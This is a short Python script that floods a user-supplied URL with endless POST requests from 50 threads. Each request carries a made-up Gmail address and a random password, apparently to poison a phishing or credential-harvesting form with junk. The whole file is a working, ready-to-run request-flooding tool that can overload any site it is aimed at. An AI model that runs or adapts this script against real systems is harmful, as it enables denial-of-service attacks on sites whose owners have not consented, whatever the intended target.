import threading
import httpx
import random
import string

# List of names to generate email addresses
names = [
    "alice", "bob", "charlie", "dave", "eve", "fred", "george",
    "harry", "ivan", "james", "kyle", "larry", "mike", "noah", "oliver", "peter",
    "quincy", "ricky", "samuel", "tom", "ulysses", "victor", "wesley", "xavier",
    "yusuf", "zachary"
]

def generate_random_email():
    name = random.choice(names)
    domain = "@gmail.com" 
    return name + str(random.randint(1, 100)) + domain

def generate_random_password():
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(8))

def send_post(client, url):
    while True:
        email = generate_random_email()
        password = generate_random_password()
        data = {
            "a": email,
            "az": password
        }
        try:
            response = client.post(url, data=data)
            print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}")
        except httpx.RequestError as exc:
            print(f"An error occurred while requesting {exc.request.url!r}: {exc}")

def main():
    url = input("Enter the URL of the target you want to flood: ")

    threads = []
    num_threads = 50

    with httpx.Client() as client:
        for i in range(num_threads):
            t = threading.Thread(target=send_post, args=(client, url,))
            t.daemon = True
            threads.append(t)

        for i in range(num_threads):
            threads[i].start()

        for i in range(num_threads):
            threads[i].join()

if __name__ == "__main__":
    main()
